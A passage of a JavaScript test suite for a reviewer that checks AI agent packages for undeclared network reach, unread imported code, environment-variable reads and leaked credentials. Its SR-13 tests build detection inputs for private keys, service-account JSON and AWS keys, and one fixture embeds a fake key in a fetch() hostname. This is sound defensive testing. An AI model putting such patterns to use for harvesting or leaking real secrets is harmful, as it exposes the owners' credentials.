  for (const [specifier, file] of [["#x", PROGRAM_PATH], ["#y", "main.mjs"]]) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}`);
    assert.equal(r.file, file);
    assert.equal(r.line, 1);
  }
});

test("SR-22 passes a bare import in a package that ships no package.json, from a skill or from the package root", () => {
  const p = withProgram(['import pad from "left-pad";', basePackage()[PROGRAM_PATH]].join("\n"));
  p["main.mjs"] = 'import pad from "left-pad";\nexport default pad;\n';
  const { status, answer } = review(p);
  assert.equal(status, 0);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-10 refuses each missing or malformed spending limit once, with a non-blank why", () => {
  const owners = [{}, { ceilings: [] }, { spend_limit: null, ceilings: [] }, { spend_limit: { ...LIMIT, per: "week" }, ceilings: [] }];
  for (const owner of owners) {
    const { answer } = review(basePackage(), owner);
    assert.deepEqual(rules(answer), ["spend-limit"], `${JSON.stringify(owner)}: ${JSON.stringify(answer?.refusals ?? null)}`);
    const { why } = answer.refusals[0];
    assert.ok(typeof why === "string" && why.trim(), `${JSON.stringify(owner)} says why`);
  }
});

test("SR-17 accepts knowingly a system whose access is unstated, with a non-blank what and why", () => {
  for (const access of [undefined, null]) {
    const p = basePackage();
    if (access === undefined) delete p["agent-descriptor.json"].systems[0].access;
    else p["agent-descriptor.json"].systems[0].access = access;
    const { answer } = review(p);
    assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
    const a = accepted(answer);
    assert.equal(a.length, 1, `access ${access}: ${JSON.stringify(a)}`);
    assert.equal(a[0].system, "ticket-store");
    for (const k of ["what", "why"]) assert.ok(typeof a[0][k] === "string" && a[0][k].trim(), `${k} for access ${access}`);
  }
});

test("SR-22 passes a percent-decoded import of a shipped file, an import Node rejects for an encoded slash or backslash, and a require with a backslash", () => {
  const p = withProgram(['import { shape } from "./%73hape.mjs";', 'import x from "./a%2Fb.mjs";', 'import y from "./a%5Cb.mjs";', 'import z from "./a%5cb.mjs";', basePackage()[PROGRAM_PATH]].join("\n"));
  p["skills/read-tickets/scripts/shape.mjs"] = "export const shape = 1;\n";
  p["skills/read-tickets/scripts/load.cjs"] = 'const s = require(".\\\\shape.mjs");\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
});

test("SR-22 refuses an import whose query leaves a folder, and a require that reads ?x as part of its path", () => {
  const S = "skills/read-tickets/scripts";
  const p = withProgram(['import l from "./lib/?x";', basePackage()[PROGRAM_PATH]].join("\n"));
  p[`${S}/lib.mjs`] = "export default 1;\n";
  p[`${S}/lib.js`] = "module.exports = 1;\n";
  p[`${S}/shape.mjs`] = "export const shape = 1;\n";
  p[`${S}/load.cjs`] = 'const s = require("./shape.mjs?x");\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  for (const [specifier, file] of [["./lib/?x", PROGRAM_PATH], ["./shape.mjs?x", `${S}/load.cjs`]]) {
    const r = refusal(answer, "unread-code", specifier);
    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
    assert.equal(r.file, file);
    assert.equal(r.line, 1);
  }
});

test("SR-12 takes an owner number of 0 or 0.5, skips a null owner entry, and refuses -0.5, naming the system", () => {
  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "runtime" }]);
  for (const [ceilings, most] of [[[{ system: "ticket-store", per: "task", most: 0 }], 0], [[{ system: "ticket-store", per: "task", most: 0.5 }], 0.5],
    [[null, { system: "ticket-store", per: "task", most: 2 }], 2]]) {
    const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings });
    assert.equal(answer?.result, "passed", `${JSON.stringify(ceilings)}: ${JSON.stringify(answer?.refusals ?? null)}`);
    assert.deepEqual(answer.statement.spends.ceilings, [{ system: "ticket-store", per: "task", most, enforced_by: "runtime" }]);
  }
  const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: -0.5 }] });
  assert.deepEqual(rules(answer), ["ceiling-unset"], JSON.stringify(answer?.refusals ?? null));
  assert.equal(answer.refusals[0].system, "ticket-store");
});

test("SR-16 passes a per-task limit, systems with no name, and a platform ceiling on a system with no credential, accepting none of them knowingly", () => {
  const p = basePackage();
  p["agent-descriptor.json"].systems.push(
    { name: "text-reasoning", access: "read", needs: "to summarize the tickets" }, { access: "write", needs: "x", leaves: true }, null,
  );
  p["agent-runtime-requirements.json"].systems.push(
    { name: "text-reasoning", kind: "mcp", spends: { unit: "tokens" } }, { kind: "service", spends: { unit: "calls" } }, null,
  );
  p["agent-runtime-requirements.json"].ceilings = [{ system: "text-reasoning", per: "task", enforced_by: "platform" }];
  const limit = { ...LIMIT, per: "task" };
  const { answer } = review(p, { spend_limit: limit, ceilings: [{ system: "text-reasoning", per: "task", most: 3 }] });
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.reaches.map((r) => r.system).sort(), ["text-reasoning", "ticket-store"]);
  assert.deepEqual(answer.statement.spends, { limit, ceilings: [{ system: "text-reasoning", per: "task", most: 3, enforced_by: "platform" }] });
  assert.deepEqual(accepted(answer), []);
});

test("SR-23 names mcp.json in its unreadable refusal when it carries no mcpServers", () => {
  const { answer } = review({ ...basePackage(), "mcp.json": "{}\n" });
  assert.deepEqual(rules(answer), ["unreadable"], JSON.stringify(answer?.refusals ?? null));
  assert.equal(answer.refusals[0].file, "mcp.json");
  assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim());
});


// Python imports, environment reads, process starts and URL forms (reopen 3, pyrest slice)

test("SR-22 decodes each Python escape in an import_module literal as Python does, naming the module path it gives", () => {
  const dir = "skills/read-tickets/scripts";
  const bs = "\\";
  const cases = [
    ['"t\\x65sts"', "\n", "tests"],
    ['"tests"', "\n", "tests"],
    ['"t\\U00000065sts"', "\n", "tests"],
    ['"t\\145sts"', "\n", "tests"],
    ['"te\\\nsts"', "\n", "tests"],
    ['"te\\\rsts"', "\n", "tests"],
    ['"te\\\r\nsts"', "\r\n", "tests"],
    ['"tests.a\\1"', "\n", "tests.a\u0001"],
    [`"tests.${bs}${bs}${bs}'${bs}"${bs}a${bs}b${bs}f${bs}n${bs}r${bs}t${bs}v"`, "\n", "tests.\\'\"\x07\b\f\n\r\t\x0b"],
  ];
  const p = basePackage();
  cases.forEach(([literal, eol], i) => { p[`${dir}/load${i}.py`] = `import importlib${eol}importlib.import_module(${literal})${eol}`; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  assert.deepEqual([...new Set(rules(answer))], ["unread-code"], JSON.stringify(answer.refusals));
  cases.forEach(([literal, , system], i) => {
    const found = answer.refusals.filter((r) => r.file === `${dir}/load${i}.py`).map((r) => [r.system, r.line]);
    assert.deepEqual(found, [[system, 2]], literal);
  });
});

test("SR-22 passes an import_module call with no argument, a computed name or a bytes literal, and a print of a test name", () => {
  const dir = "skills/read-tickets/scripts";
  const calls = [
    "importlib.import_module()",
    "importlib.import_module(name)",
    'importlib.import_module("tests." + name)',
    'importlib.import_module(b"tests")',
    'importlib.import_module(b"a.tests.b")',
    'print("tests")',
  ];
  const p = basePackage();
  calls.forEach((call, i) => { p[`${dir}/load${i}.py`] = `import importlib\nname = "x"\n${call}\n`; });
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.accepted_knowingly, []);
  const nc = answer.statement.not_checked;
  assert.ok(nc.some((line) => /computed at runtime/i.test(line)) && nc.some((line) => /module path/i.test(line)), JSON.stringify(nc));
});

test("SR-22 refuses an import_module literal in parentheses, in adjacent parts, beside a package, or as an f-string with no field", () => {
  const dir = "skills/read-tickets/scripts";
  const calls = [
    ['importlib.import_module(("tests"))', "tests"],
    ['importlib.import_module("tests" "." "x")', "tests.x"],
    ['importlib.import_module("tests", name)', "tests"],
    ['importlib.import_module(f"tests")', "tests"],
    ['importlib.import_module(f"tests.{{x}}")', "tests.{x}"],
  ];
  const p = basePackage();
  calls.forEach(([call], i) => { p[`${dir}/load${i}.py`] = `import importlib\nname = "x"\n${call}\n`; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  assert.deepEqual([...new Set(rules(answer))], ["unread-code"], JSON.stringify(answer.refusals));
  calls.forEach(([call, system], i) => {
    const found = answer.refusals.filter((r) => r.file === `${dir}/load${i}.py`).map((r) => [r.system, r.line]);
    assert.deepEqual(found, [[system, 3]], call);
  });
});

test("SR-22 refuses a PEP 263 declaration on either of Python's first two lines, naming the line it is on by line feeds", () => {
  const dir = "skills/read-tickets/scripts";
  const two = "#!/usr/bin/env python\n# -*- coding: latin-1 -*-\nprint(1)\n";
  const programs = [
    [two, 2],
    [two.replace(/\n/g, "\r\n"), 2],
    [two.replace(/\n/g, "\r"), 1], // a lone \r ends Python's first line, but a line is counted by \n alone
    ["\n# coding: latin-1\n", 2],
    ["#\n# coding: latin-1\n", 2],
    ["# coding=latin-1\n", 1],
    ["#coding: latin-1\n", 1],
  ];
  const p = basePackage();
  programs.forEach(([text], i) => { p[`${dir}/enc${i}.py`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  programs.forEach(([text, line], i) => {
    const found = answer.refusals.filter((r) => r.file === `${dir}/enc${i}.py`);
    assert.deepEqual(found.map((r) => [r.rule, r.system]), [["unread-code", "coding: latin-1"]], JSON.stringify(text));
    if (line !== null) assert.equal(found[0].line, line, JSON.stringify(text));
  });
});

test("SR-22 passes a coding comment after a line of code or after code on its line, and one that names no encoding", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  ["x = 1\n# coding: latin-1\n", "x = 1  # coding: latin-1\n", "# coding: \n"].forEach((text, i) => { p[`${dir}/enc${i}.py`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.accepted_knowingly, []);
});

test("SR-22 reads a Python program CPython rejects as far as it can, refusing none as unreadable and inventing no import", () => {
  const dir = "skills/read-tickets/scripts";
  const clean = basePackage();
  ["import\n", "import a,\n", "import importlib\nimportlib.import_module('a'"].forEach((text, i) => { clean[`${dir}/bad${i}.py`] = text; });
  const first = review(clean).answer;
  assert.equal(first?.result, "passed", JSON.stringify(first?.refusals ?? first));
  assert.deepEqual(first.statement.accepted_knowingly, []);

  // Each file may name only the module path it spells. The first must be named: it is found before the error.
  const named = [
    ["import tests.helpers\nimport a,\n", "tests.helpers"],
    ["from tests\n", "tests"],
    ["import a as 1, tests\n", "tests"],
    ["from pkg import a as 1, tests\n", "pkg.tests"],
  ];
  const p = basePackage();
  named.forEach(([text], i) => { p[`${dir}/bad${i}.py`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused", JSON.stringify(answer));
  assert.ok(refusal(answer, "unread-code", "tests.helpers"), JSON.stringify(answer.refusals));
  for (const r of answer.refusals) {
    const i = named.findIndex((_, k) => r.file === `${dir}/bad${k}.py`);
    assert.deepEqual([r.rule, r.system, r.line], ["unread-code", named[i]?.[1], 1], JSON.stringify(r));
  }
});

test("SR-22 reads past a comment inside the brackets of a from-import or an import_module call", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/a.py`] = "from pkg import (\n    a,  # first\n    tests,\n)\n";
  p[`${dir}/b.py`] = 'import importlib\nimportlib.import_module(  # which\n    "tests")\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  const found = answer.refusals.map((r) => [r.rule, r.system, r.file, r.line]).sort((a, b) => (a[2] < b[2] ? -1 : 1));
  assert.deepEqual(found, [["unread-code", "pkg.tests", `${dir}/a.py`, 1], ["unread-code", "tests", `${dir}/b.py`, 3]]);
});

test("SR-17 accepts knowingly an os.system call that a comment splits inside parentheses", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/run.py`] = "import os\n(os  # c\n .system('ls'))\n";
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  const a = answer.statement.accepted_knowingly;
  assert.equal(a.length, 1, JSON.stringify(a));
  assert.equal(a[0].file, `${dir}/run.py`);
});

test("SR-09 names each destructured credential-like key, quoted or not, at the line it is written on", () => {
  const dir = "skills/read-tickets/scripts";
  const programs = [
    ["const {API_KEY} = process.env;\n", [["API_KEY", 1]]],
    ['const { "API_KEY": k } = process.env;\n', [["API_KEY", 1]]],
    ["const {\nAPI_KEY } = process.env;\n", [["API_KEY", 2]]],
    ["const {A_KEY,\nB_KEY} = process.env;\n", [["A_KEY", 1], ["B_KEY", 2]]],
    ["const {\n  A_KEY,\n  B_KEY,\n} = process.env;\n", [["A_KEY", 2], ["B_KEY", 3]]],
    ["const {a,b,c,d,KEY\n} = process.env;\n", [["KEY", 1]]],
  ];
  const p = basePackage();
  programs.forEach(([text], i) => { p[`${dir}/env${i}.mjs`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  programs.forEach(([text, want], i) => {
    const found = answer.refusals
      .filter((r) => r.rule === "undeclared-reach" && r.file === `${dir}/env${i}.mjs`)
      .map((r) => [r.system, r.line])
      .sort((x, y) => x[1] - y[1]);
    assert.deepEqual(found, want, JSON.stringify(text));
  });
});

test("SR-09 reads no name from a rest element or an empty key, and accepts knowingly a destructured name that is not credential-like", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/one.mjs`] = "const { a } = process.env;\n";
  p[`${dir}/rest.mjs`] = "const { HOME, ...REST_TOKEN } = process.env;\n";
  p[`${dir}/empty.mjs`] = 'const { "": k } = process.env;\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  const a = answer.statement.accepted_knowingly;
  assert.deepEqual(a.map((x) => x.file).sort(), [`${dir}/one.mjs`, `${dir}/rest.mjs`], JSON.stringify(a));
  assert.match(a.find((x) => x.file === `${dir}/rest.mjs`).what, /HOME/);
  assert.ok(!JSON.stringify(answer).includes("REST_TOKEN"), "a rest element reads no name");
});

test("SR-22 refuses a name a from-import lists after an as-alias, naming the module path", () => {
  const dir = "skills/read-tickets/scripts";
  const programs = ["from pkg import a as b, tests\n", "from pkg import (a as b, tests)\n", "from pkg import a as b, c as d, tests as t\n"];
  const p = basePackage();
  programs.forEach((text, i) => { p[`${dir}/alias${i}.py`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  programs.forEach((text, i) => {
    const found = answer.refusals.filter((r) => r.file === `${dir}/alias${i}.py`).map((r) => [r.rule, r.system, r.line]);
    assert.deepEqual(found, [["unread-code", "pkg.tests", 1]], JSON.stringify(text));
  });
});

test("SR-09 reads no environment variable through a name that only ends in os, or by an empty name", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/xos.py`] = [
    "class X:",
    "    environ = {}",
    "    def getenv(self, k): return k",
    "xos = X()",
    'a = xos.environ["API_KEY"]',
    'b = xos.environ.get("API_KEY")',
    'c = xos.getenv("API_KEY")',
    "",
  ].join("\n");
  p[`${dir}/empty.py`] = 'import os\na = os.environ[""]\nb = os.environ.get("")\nc = os.getenv("")\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  assert.deepEqual(answer.statement.accepted_knowingly, []);
});

test("SR-17 accepts knowingly an os.system call with or without its import, and no platform.system, os.path or node:fs use", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/sys0.py`] = "import os; os.system('ls')\n";
  p[`${dir}/sys1.py`] = "# entry point\nos.system('ls')\n";
  p[`${dir}/plat.py`] = "import platform\nplatform.system()\n";
  p[`${dir}/path.py`] = "import os\nos.path.join('a')\n";
  p[`${dir}/fs.mjs`] = 'import fs from "node:fs";\nexport default fs;\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  const a = answer.statement.accepted_knowingly;
  assert.deepEqual(a.map((x) => x.file).sort(), [`${dir}/sys0.py`, `${dir}/sys1.py`], JSON.stringify(a));
});

test("SR-22 refuses a literal test module passed to a bare import_module, one imported from importlib, or another object's", () => {
  const dir = "skills/read-tickets/scripts";
  const programs = [
    "# entry point\nimport_module('tests')\n",
    "from importlib import import_module\nimport_module('tests')\n",
    "import os\nx.import_module('tests')\n",
  ];
  const p = basePackage();
  programs.forEach((text, i) => { p[`${dir}/call${i}.py`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  programs.forEach((text, i) => {
    const found = answer.refusals.filter((r) => r.file === `${dir}/call${i}.py`).map((r) => [r.rule, r.system, r.line]);
    assert.deepEqual(found, [["unread-code", "tests", 2]], JSON.stringify(text));
  });
});

test("SR-08 does not refuse text a URL parser rejects or a host written as a field, and still refuses a URL beside them", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/rej.mjs`] = 'export const u = "http://:8080/x";\nexport const v = "https://ok.example/";\n';
  p[`${dir}/tpl.mjs`] = "const host = 'h';\nexport const u = `https://${host}/x`;\n";
  p[`${dir}/rej.py`] = 'u = "http://:8080/x"\nv = "https://[::1/x"\n';
  p[`${dir}/fstr.py`] = 'host = "h"\nu = f"https://{host}/x"\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  assert.deepEqual(answer.refusals.map((r) => [r.rule, r.system, r.file, r.line]), [["undeclared-reach", "ok.example", `${dir}/rej.mjs`, 2]]);
});


// SR-01: one answer for a Python program cut off mid-token (reopen 3, pytok slice)

test("SR-01 answers once, on one line, for a Python program cut off inside an f-string field, a format spec or a string", () => {
  const programs = [
    'import subprocess\ns = f"{x:',
    'import subprocess\ns = f"{x',
    'import subprocess\ns = "abc',
    "{{}}f'\\{if",
    "a{bcdefghij:\nf'{y:",
    ";'{\"\"\"import subprocess'\\\n\\{ifr\"'''",
  ];
  for (const text of programs) {
    const p = basePackage();
    p["skills/read-tickets/scripts/cut.py"] = text;
    const { status, stdout, answer } = review(p);
    assert.equal(status, 0, JSON.stringify(text));
    assert.ok(stdout.endsWith("\n"), `the answer ends with a newline: ${JSON.stringify(text)}`);
    assert.equal(stdout.trimEnd().split("\n").length, 1, `the answer is on one line: ${JSON.stringify(text)}`);
    assert.ok(answer !== null && typeof answer === "object" && !Array.isArray(answer), JSON.stringify(text));
    assert.ok(["passed", "refused"].includes(answer.result), `${JSON.stringify(text)}: ${answer.result}`);
  }
});


// Reopen 3, slice "others": tests for spec 0.3.0.

test("SR-01 still writes one JSON object for a request too deep to finish, refused as unreadable with the package it read", () => {
  // An extra member of the owner's limit, 100,000 arrays deep. JSON.parse reads it, and Node's
  // JSON.stringify cannot write it back, so a reviewer that echoes the limit cannot finish.
  const dir = writePackage(basePackage());
  const depth = 100000;
  const text = `{"review":"v1","ask":"review","package":${JSON.stringify(dir)},"owner":{"spend_limit":`
    + `{"most_micro":1,"currency":"USD","per":"day","note":${"[".repeat(depth)}${"]".repeat(depth)}},"ceilings":[]}}`;
  const { status, stdout, answer } = run(text);
  assert.equal(status, 0);
  assert.ok(stdout.endsWith("\n"), "the answer ends with a newline");
  assert.equal(stdout.trimEnd().split("\n").length, 1, "the answer is on one line");
  assert.ok(answer !== null && typeof answer === "object", `one JSON object: ${stdout.slice(0, 200)}`);
  if (answer.result === "passed") {
    // A reviewer that can write this depth must state the limit member for member (SR-16).
    let note = answer.statement.spends.limit.note;
    let d = 1;
    while (Array.isArray(note) && note.length === 1) { note = note[0]; d += 1; }
    assert.deepEqual([d, note], [depth, []], "the note, member for member");
    return;
  }
  assert.equal(answer.result, "refused", stdout.slice(0, 200));
  assert.deepEqual(rules(answer), ["unreadable"], JSON.stringify(answer.refusals));
  assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), "the refusal says why");
  assert.deepEqual(answer.package, { name: "ticket-reader", version: "0.1.0", digest: expectedDigest(dir) }, "the package it read");
});

test("SR-02 refuses a request that is JSON but not an object, is not JSON, or carries another review, each with a why", () => {
  const dir = writePackage(basePackage());
  const inputs = ["null", "5", '"v1"', `[${JSON.stringify(request(dir))}]`, "this is not json", "", { ...request(dir), review: "v2" }];
  for (const input of inputs) {
    const label = JSON.stringify(input).slice(0, 80);
    const { status, answer } = run(input);
    assert.equal(status, 0, label);
    assert.equal(answer?.result, "refused", label);
    assert.deepEqual(rules(answer), ["bad-request"], label);
    assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), `${label} says why`);
  }
});

test("SR-02 refuses a review that names no package, or a blank or non-string one, and never reviews its working directory instead", () => {
  const cwd = writePackage(basePackage());
  const owner = { spend_limit: { ...LIMIT }, ceilings: [] };
  assert.equal(run({ review: "v1", ask: "review", package: ".", owner }, cwd).answer?.result, "passed", "the working directory is a sound package");
  for (const pkg of [undefined, "", "  ", "\n\t", 5, null, ["."]]) {
    const req = { review: "v1", ask: "review", owner };
    if (pkg !== undefined) req.package = pkg;
    const label = pkg === undefined ? "no package" : `package ${JSON.stringify(pkg)}`;
    const { status, answer } = run(req, cwd);
    assert.equal(status, 0, label);
    assert.equal(answer?.result, "refused", label);
    assert.deepEqual(rules(answer), ["bad-request"], `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
    assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), `${label} says why`);
    assert.equal(answer.package, undefined, `${label}: the working directory is not read`);
  }
});

test("SR-05 refuses a missing package directory, a missing declaration, or one that is not JSON, as unreadable with a why", () => {
  const changes = [
    ["no descriptor", (p) => { p["agent-descriptor.json"] = null; }],
    ["no runtime requirements", (p) => { p["agent-runtime-requirements.json"] = null; }],
    ["a descriptor that is not JSON", (p) => { p["agent-descriptor.json"] = "{ not json"; }],
    ["runtime requirements that are not JSON", (p) => { p["agent-runtime-requirements.json"] = "{ not json"; }],
    ["a descriptor.json that is not JSON", (p) => { p["agent-descriptor.json"] = null; p["descriptor.json"] = "{ not json"; }],
    ["an install.json that is not JSON", (p) => { p["agent-runtime-requirements.json"] = null; p["install.json"] = "{ not json"; }],
  ];
  const answers = [["a missing package directory", run(request(join(AGENT, "test", "no-such-package"))).answer]];
  for (const [label, change] of changes) {
    const p = basePackage();
    change(p);
    answers.push([label, review(p).answer]);
  }
  for (const [label, answer] of answers) {
    assert.equal(answer?.result, "refused", label);
    assert.ok(rules(answer).includes("unreadable"), `${label}: ${JSON.stringify(answer.refusals)}`);
    for (const r of answer.refusals) assert.ok(typeof r.why === "string" && r.why.trim(), `${label}: ${r.rule} says why`);
  }
  assert.deepEqual(rules(answers[0][1]), ["unreadable"], "a missing directory, with a sound limit, is refused once");
});

test("SR-05 refuses as unreadable a descriptor or runtime requirements that parses as JSON but not as an object", () => {
  // Beside each, the other declaration names no system, and no program ships, so a reviewer that
  // read the non-object as empty would pass the package.
  const bare = (p) => {
    p[PROGRAM_PATH] = null;
    p["agent-descriptor.json"].systems = [];
    p["agent-runtime-requirements.json"].systems = [];
    return p;
  };
  const cases = [
    ["agent-descriptor.json", "[]\n"], ["agent-descriptor.json", "5\n"], ["agent-descriptor.json", "null\n"],
    ["agent-runtime-requirements.json", "[]\n"], ["agent-runtime-requirements.json", "null\n"],
    ["descriptor.json", '"text"\n'], ["install.json", "5\n"],
  ];
  const current = { "descriptor.json": "agent-descriptor.json", "install.json": "agent-runtime-requirements.json" };
  assert.equal(review(bare(basePackage())).answer?.result, "passed", "the bare package passes");
  for (const [name, body] of cases) {
    const p = bare(basePackage());
    if (current[name]) p[current[name]] = null;
    p[name] = body;
    const { answer } = review(p);
    const label = `${name} ${JSON.stringify(body)}`;
    assert.equal(answer?.result, "refused", label);
    assert.deepEqual(rules(answer), ["unreadable"], `${label}: ${JSON.stringify(answer.refusals)}`);
    assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim(), `${label} says why`);
  }
});

test("SR-13 refuses every form the publisher's patterns accept: each private key type, compact service-account JSON, an ASIA key and an AWS secret written without spaces", () => {
  const D = "-".repeat(5);
  const header = (type) => [D, "BEGIN ", type, "PRIVATE", " KEY", D].join("");
  const nkey = ["S", "A", "A2B3C4D5E6F7G2H3".repeat(3), "IJKLMNOP"].join("");
  const asia = ["AS", "IA", "QQQQ", "EXAMPLE0", "ABCD"].join("");
  const forms = [
    [`${header("EC ")}\nMHcCAQEEIBkg\n`, header("EC "), /private key/i],
    [`${header("DSA ")}\nMIIBuwIBAAKB\n`, header("DSA "), /private key/i],
    [`${header("OPENSSH ")}\nb3BlbnNzaC1r\n`, header("OPENSSH "), /private key/i],
    [`${header("PGP ")}\nlQOYBF0AAAAB\n`, header("PGP "), /private key/i],
    [['{"type":"service', '_account"}\n'].join(""), ['"type":"service', '_account"'].join(""), /service-account key/i],
    [['{"private', '_key":"', D, 'BEGIN\\nMIIEvQ"}\n'].join(""), ['"private', '_key":"', D, "BEGIN"].join(""), /service-account key/i],
    [`id = ${asia}\n`, asia, /AWS access key/i],
    [`${["aws_secret", "_access_key="].join("")}${"K".repeat(20)}\n`, `${["aws_secret", "_access_key="].join("")}${"K".repeat(20)}`, /AWS secret key/i],
    [`${["AWS_SECRET", "_ACCESS_KEY: "].join("")}${"Q".repeat(24)}\n`, `${["AWS_SECRET", "_ACCESS_KEY: "].join("")}${"Q".repeat(24)}`, /AWS secret key/i],
    [`seed ${nkey} here\n`, nkey, /NKey seed/i],
  ];
  const p = basePackage();
  forms.forEach(([text], i) => { p[`references/form-${i}.md`] = text; });
  const { answer, stdout } = review(p);
  assert.equal(answer?.result, "refused");
  forms.forEach(([text, secret, kind], i) => {
    const file = `references/form-${i}.md`;
    const found = (answer.refusals ?? []).filter((r) => r.rule === "credential-in-files" && r.file === file);
    assert.ok(found.some((r) => kind.test(r.why)), `${JSON.stringify(text)} is refused as ${kind}: ${JSON.stringify(found)}`);
    assert.ok(!stdout.toLowerCase().includes(secret.toLowerCase()), `does not repeat ${JSON.stringify(secret)}`);
  });
});

test("SR-13 passes text just outside each credential pattern's bounds, and refuses the same text inside them", () => {
  const D = "-".repeat(5);
  const key = FAKE.awsAccessKey();
  const secret = ["aws_secret", "_access_key = "].join("");
  const seed = ["S", "U", "A2B3C4D5E6F7G2H3".repeat(3), "IJKLMNOP"].join("");
  const keystore = ["BEGIN ENCRYPTED", " PRIVATE KEY"].join("");
  const rsa = ["BEGIN RSA", " PRIVATE KEY"].join("");
  const outside = [
    `id=x${key}\n`, `id = ${key}E\n`, `${secret}${"K".repeat(19)}\n`, `seed x${seed} here\n`, `seed ${seed}Q here\n`,
    `----${keystore}${D}\n`, `${D}${keystore}----\n`, `----${rsa}${D}\n`,
  ];
  const inside = [`id = ${key}\n`, `${secret}${"K".repeat(20)}\n`, `seed ${seed} here\n`, `${D}${keystore}${D}\n`, `${D}${rsa}${D}\n`];
  const p = basePackage();
  outside.forEach((text, i) => { p[`references/outside-${i}.md`] = text; });
  const { answer } = review(p);
  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
  const q = basePackage();
  inside.forEach((text, i) => { q[`references/inside-${i}.md`] = text; });
  const refused = review(q).answer;
  inside.forEach((text, i) => {
    assert.ok(refused?.refusals?.some((r) => r.rule === "credential-in-files" && r.file === `references/inside-${i}.md`), `refuses ${JSON.stringify(text)}`);
  });
});

test("SR-13 withholds a private key in a declaration field as its whole block, keeping the text after its END line", () => {
  const D = "-".repeat(5);
  const begin = (type) => [D, "BEGIN ", type, "PRIVATE", " KEY", D].join("");
  const end = [D, "END ", "PRIVATE", " KEY", D].join("");
  const cases = [
    [`${begin("")}\nMIIEvQIBADANBgkqhkiG\n${end} for signing`, ["MIIEvQIBADANBgkqhkiG", "BEGIN PRIVATE KEY", "END PRIVATE KEY"], "for signing"],
    [`${begin("RSA ")}\nMIIBOgIBAAJBAKj34Gkx\nwDtNlx7zyQq0WwVYY2Hn`, ["MIIBOgIBAAJBAKj34Gkx", "wDtNlx7zyQq0WwVYY2Hn", "BEGIN RSA PRIVATE KEY"], null],
    // A line with four dashes on either side is not an END line, so the block runs on past it.
    [`${begin("")}\nMIIEvQIBADANBgkqhkiG\n${end.slice(1)}\nQ2VydGlmaWNhdGVPbmU\n${end.slice(0, -1)}\nU2Vjb25kQm9keUxpbmU\n${end} for signing`,
      ["MIIEvQIBADANBgkqhkiG", "Q2VydGlmaWNhdGVPbmU", "U2Vjb25kQm9keUxpbmU"], "for signing"],
  ];
  for (const [name, hidden, kept] of cases) {
    const p = basePackage();
    p["agent-descriptor.json"].systems.push({ name, access: "read" });
    const { answer, stdout } = review(p);
    assert.equal(answer?.result, "refused");
    for (const h of hidden) assert.ok(!stdout.toLowerCase().includes(h.toLowerCase()), `withholds ${h}: ${stdout.slice(0, 300)}`);
    const r = refusal(answer, "systems-mismatch");
    assert.ok(r && typeof r.system === "string", "names the system only the descriptor has");
    if (kept) assert.ok(r.system.endsWith(kept), `keeps the text after the block: ${JSON.stringify(r.system)}`);
  }
});

test("SR-13 withholds the union of overlapping credential matches, leaving no fragment of any match in a name or a host", () => {
  const key = FAKE.awsAccessKey();
  const other = ["AK", "IA", "ZZZZZZZZZZZZZZZZ"].join("");
  const secret = ["aws_secret", "_access_key = "].join("");
  const cases = [
    ["a secret whose value starts with an access key", (p) => {
      p["agent-descriptor.json"].systems.push({ name: `${secret}${key}+x and more`, access: "read", needs: "x" });
    }, [secret.trim(), key, "+x"]],
    ["one key removed from a lowercased host, around another", (p) => {
      p["references/notes.md"] = `${key}\n${other}\n`;
      p[PROGRAM_PATH] += `fetch("https://${key.slice(0, 8)}${other}${key.slice(8)}.example.com/");\n`;
    }, [key, other]],
    ["two secrets in one decoded name", (p) => {
